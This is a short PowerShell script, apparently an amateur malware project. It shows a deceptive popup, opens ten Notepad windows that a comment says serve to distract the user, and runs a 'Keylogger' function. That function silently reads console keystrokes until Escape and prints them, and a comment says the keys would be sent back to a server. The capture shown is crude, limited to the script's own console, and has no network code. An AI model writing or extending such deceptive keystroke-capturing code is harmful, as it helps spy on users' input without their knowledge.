#Need to alert if the application is working
function Alert {
    $wshell = New-Object -ComObject Wscript.Shell
    $Output = $wshell.Popup("Nothing is going on here", 0, "Nothing")
    $Output
}

#Used to send an array of keys, to then send back to the user, can be very basic
function Keylogger {
    $notpressed = $true
    #Array declared
    $keysnoted = [System.Collections.ArrayList]::new()
    #Will send a certain amount until certain key is pressed
    while ($notpressed) {
        #Noted the key stroke, is true to surpress the key strokes just puts in numbers
        $key = [System.Console]::ReadKey($true)
        #Check if the key that has been searched is completed
        if ($key.Key -eq [System.ConsoleKey]::Escape){
            $notpressed = $false
        }
        #Add to the string
        $keysnoted.Add($key.keychar)
    }
    #Need to show the output of the keys just as a line, will instead send the keys back to the server when ran if needed to then output there
    Write-Host "Collected Keys: $($keysnoted -join '')"
}

#Just used to distract the user
function OpeningNotepad {
    for ($i = 0; $i -lt 10; $i++) {
            Start-Process -FilePath "notepad.exe"
    }
}

Write-Warning "This is a warning"
Alert
OpeningNotepad
Keylogger